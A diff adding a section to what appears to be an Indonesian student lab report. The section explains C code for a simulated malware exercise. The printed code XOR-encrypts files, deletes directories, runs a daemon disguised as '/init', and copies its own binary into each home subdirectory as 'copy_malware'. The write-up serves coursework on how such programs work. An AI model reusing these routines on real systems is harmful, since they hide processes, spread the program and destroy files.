@@ -353,6 +353,135 @@ if (argc != 2) {
 ini adalah salah satu potongan kode di fungsi `main()` yang merupakan sebuah error handling yang mana ketika user memasukkan perintah yang tidak ada, maka menghasilkan output "opsi tidak dikenali"
 
 ## Soal no 3
+```
+#define BASE_DIR "/home/ardhana_48/malware_test"  
+#define GROUP_NUM 2  
+#define ZIP_NAME "folder_in.zip"
+#define SECRET_FILE "secret.txt"
+```
+Disini kita akan memastikan mendefine agar kode berjalan di Base Directory User yang berada di format tersebut, juga akan mengeksekusi `folder_in.zip` serta teks `secret.txt`.
+```
+void make_dir(const char *path) {
+    mkdir(path, 0755);
+}
+
+void write_file(const char *filepath, const char *content) {
+    int fd = open(filepath, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+    if (fd >= 0) {
+        write(fd, content, strlen(content));
+        close(fd);
+    }
+}
+```
+Parameter input berupa string yang mewakili path (lokasi) direktori yang akan dibuat. Kalau folder sudah ada, maka mkdir akan gagal, tapi dalam kode ini tidak dicek apakah mkdir sukses atau gagal. Bisa ditambahkan error checking kalau mau lebih robust. `mkdir(path, 0755);` Fungsi dari pustaka `<sys/stat.h>` yang digunakan untuk membuat folder.
+```
+void xor_encrypt(const char *filepath, unsigned char key) {
+    int fd = open(filepath, O_RDWR);
+    if (fd < 0) return;
+
+    char buf;
+    while (read(fd, &buf, 1) == 1) {
+        buf ^= key;
+        lseek(fd, -1, SEEK_CUR);
+        write(fd, &buf, 1);
+    }
+    close(fd);
+}
+void simulate_zip(const char *src_dir, const char *zip_path) {
+    int out = open(zip_path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+    if (out < 0) return;
+
+    DIR *dir = opendir(src_dir);
+    struct dirent *entry;
+    char fullpath[512];
+    char buffer[1024];
+    int fd, n;
+
+    while ((entry = readdir(dir))) {
+        if (entry->d_type != DT_REG) continue;
+
+        snprintf(fullpath, sizeof(fullpath), "%s/%s", src_dir, entry->d_name);
+        fd = open(fullpath, O_RDONLY);
+        while ((n = read(fd, buffer, sizeof(buffer))) > 0) {
+            write(out, buffer, n);
+        }
+        close(fd);
+    }
+    closedir(dir);
+    close(out);
+}
+void remove_dir(const char *path) {
+    DIR *dir = opendir(path);
+    struct dirent *entry;
+    char fullpath[512];
+
+    while ((entry = readdir(dir))) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
+        unlink(fullpath);
+    }
+    closedir(dir);
+    rmdir(path);
+}
+```
+Yang pertama ada fungsi `void xor_encrypt` yang akan melakukan enkripsi XOR terhadap isi file, byte per byte. `open(filepath, O_RDWR)` akan membuka file dalam mode baca dan tulis. Jika gagal membuka, fungsi langsung return. Loop Utama akan Membaca 1 byte dari file ke dalam buf, `buf ^= key` akan melakukan operasi XOR dengan kunci (key). XOR adalah metode enkripsi sederhana. Menyandikan (atau menyembunyikan) isi file agar tidak bisa dibaca langsung. Selanjutnya ada fungsi `simulate_zip` yang akan menggabungkan seluruh isi folder ke satu file yang nanti akan membaca setiap isi file kemudian menuliskannya ke file output. Kemudian ada fungsi `remove_dir` yang nantinya menghapus semua isi dalam folder serta foldernya juga. Fungsi in tidak mendukung folder rekursif atau folder dalam folder.
+```
+void spawn_daemon() {
+    pid_t pid = fork();
+    if (pid < 0) exit(EXIT_FAILURE);
+    if (pid > 0) {
+        printf("[+] Daemon /init berjalan di PID %d\n", pid);
+        return;
+    }
+
+    // Child process jadi session leader
+    if (setsid() < 0) exit(EXIT_FAILURE);
+
+    pid_t pid2 = fork();
+    if (pid2 < 0) exit(EXIT_FAILURE);
+    if (pid2 > 0) exit(EXIT_SUCCESS); // Parent dari daemon keluar
+
+    chdir("/");
+    fclose(stdin);
+    fclose(stdout);
+    fclose(stderr);
+
+    prctl(PR_SET_NAME, (unsigned long)"/init", 0, 0, 0);
+
+    while (1) {
+        sleep(60);
+    }
+}
+```
+fungsi `Spawn_Daemon` akan menjalankan proses daemon dengan nama "/init" yang akan terus hidup di background. Prosesnya diawali dengan `fork()` untuk membuat child process, jika `fork()` gagal program keluar. Parent process akan menampilkan PID dari daemon dan kembali ke program utama. Proses digunakan untuk menyamarkan program agar terlihat seperti proses yang menyembunyikan diri.
+```
+void spread_trojan(const char *self_path) {
+    const char *home = getenv("HOME");
+    DIR *dir = opendir(home);
+    struct dirent *entry;
+    char target[512];
+    int src_fd, dst_fd;
+    char buf[1024];
+    int n;
+
+    while ((entry = readdir(dir))) {
+        if (entry->d_type != DT_DIR) continue;
+        if (entry->d_name[0] == '.') continue;
+
+        snprintf(target, sizeof(target), "%s/%s/copy_malware", home, entry->d_name);
+        src_fd = open(self_path, O_RDONLY);
+        dst_fd = open(target, O_CREAT | O_WRONLY | O_TRUNC, 0755);
+        while ((n = read(src_fd, buf, sizeof(buf))) > 0) {
+            write(dst_fd, buf, n);
+        }
+        close(src_fd);
+        close(dst_fd);
+    }
+    closedir(dir);
+```
+Fungsi `spread_trojan` menyalin file subdirektori dalam 1 user. Fungsi awalnya mendapat path direktori dari home user, kemudian membuka dan membaca entri didalamnya. Fungsi akan membuat salinan file yang sedang berjalan dengan nama copy_malware. Proses dilakukan awalnya membuka `self_path` kemudian membaca isinya di buffer, dan ditulis di `copy_malware`.
 
 ## Soal no 4
 ```
